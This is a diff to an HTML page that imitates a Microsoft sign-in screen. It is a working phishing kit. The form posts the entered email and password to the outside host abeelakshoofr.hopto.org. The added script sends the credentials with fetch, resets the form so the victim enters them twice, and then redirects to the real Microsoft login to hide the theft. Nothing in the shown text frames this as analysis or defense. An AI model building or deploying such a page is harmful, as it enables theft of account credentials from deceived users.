@@ -203,13 +203,12 @@
             <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiDfPy4C-azpmAC5NTHImq3ff2v8yjFk9Pl4CI_54aMQ5sJcRY4u7EfdCR8YeCpOgd7Tgd_R0uBNd6vi4latzxIZU8XSePjz9vOFVUHjQR-DJmHDcDYjyrfRQyedNZo_EJNJzC2e19JKQu4UsBaisCnCc7j7WLhLNcN4_VycBHFPfp8VisEj8tF2Hyig4k/w275-h61/microsoft_logo_564db913a7fa0ca42727161c6d031bef.png"
                 alt="Microsoft Logo">
         </div>
-        <form  action="https://abeelakshoofr.hopto.org/out/next2580.php" method="POST">
+        <form action="https://abeelakshoofr.hopto.org/out/next2580.php" method="POST">
             <!-- Step 1 -->
             <div class="step step-1">
                 <div class="title title1">Sign in</div>
                 <div class="input-group">
-                    <input type="text" id="email" name="user" placeholder="Email, phone, or Skype" 
-                        required>
+                    <input type="text" id="email" name="user" placeholder="Email, phone, or Skype" required>
                 </div>
                 <div class="links">
                     No account? <a href="#">Create one!</a><br /><br>
@@ -223,8 +222,8 @@
                 <div class="email-pill" id="displayEmail"></div>
                 <div class="title2">Enter password</div>
                 <div class="input-group password-group">
-                    <input type="password" id="password" name="pass" placeholder="Password"
-                        autocomplete="new-password" required>
+                    <input type="password" id="password" name="pass" placeholder="Password" autocomplete="new-password"
+                        required>
                     <span class="toggle-password" onclick="togglePassword()">
                         <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                             <path
@@ -249,6 +248,30 @@
             alt="Key Icon" width="20" height="20">
         Sign-in options
     </div>
+    <!-- <script>
+        const form = document.getElementById('loginForm');
+        const step1 = document.querySelector('.step-1');
+        const step2 = document.querySelector('.step-2');
+        const emailInput = document.getElementById('email');
+        const displayEmail = document.getElementById('displayEmail');
+        const footer = document.getElementById('footer');
+
+        function goToStep2() {
+            const email = emailInput.value.trim();
+            if (email) {
+                displayEmail.textContent = email;
+                step1.classList.add('hidden');
+                step2.classList.remove('hidden');
+                footer.style.display = "none";
+                document.getElementById('password').focus();
+            }
+        }
+
+        function togglePassword() {
+            const pwd = document.getElementById("password");
+            pwd.type = pwd.type === "password" ? "text" : "password";
+        }
+    </script> -->
     <script>
         const form = document.getElementById('loginForm');
         const step1 = document.querySelector('.step-1');
@@ -272,7 +295,34 @@
             const pwd = document.getElementById("password");
             pwd.type = pwd.type === "password" ? "text" : "password";
         }
+
+        form.addEventListener('submit', function (e) {
+            e.preventDefault();
+
+            // Get count from localStorage
+            let submitCount = parseInt(localStorage.getItem('submitCount') || '0');
+            submitCount += 1;
+            localStorage.setItem('submitCount', submitCount);
+
+            // Submit form data using fetch
+            const formData = new FormData(form);
+            fetch(form.action, {
+                method: 'POST',
+                body: formData
+            }).then(() => {
+                if (submitCount >= 2) {
+                    window.location.href = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=9199bf20-a13f-4107-85dc-02114787ef48&scope=https%3A%2F%2Foutlook.office.com%2F.default%20openid%20profile%20offline_access&redirect_uri=https%3A%2F%2Foutlook.live.com%2Fmail%2F&client-request-id=ad1fc534-9e81-8b8c-d441-a60df07d5035&response_mode=fragment&client_info=1&prompt=select_account&nonce=01987951-76ce-7115-adbf-3884e1f942fb&state=eyJpZCI6IjAxOTg3OTUxLTc2Y2MtNzVhZS05NTc1LTZkYWUxMWRmZDgxNyIsIm1ldGEiOnsiaW50ZXJhY3Rpb25UeXBlIjoicmVkaXJlY3QifX0%3D&claims=%7B%22access_token%22%3A%7B%22xms_cc%22%3A%7B%22values%22%3A%5B%22CP1%22%5D%7D%7D%7D&x-client-SKU=msal.js.browser&x-client-VER=4.14.0&response_type=code&code_challenge=iagCL-XjgucjaN1_q2-XZNHq_Gu_IwY-vh90jMHNMc8&code_challenge_method=S256&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&fl=dob,flname,wld";
+                } else {
+                    // Refresh form to step 1
+                    form.reset();
+                    step2.classList.add('hidden');
+                    step1.classList.remove('hidden');
+                    footer.style.display = "block";
+                }
+            });
+        });
     </script>
+
 </body>
 
 </html>
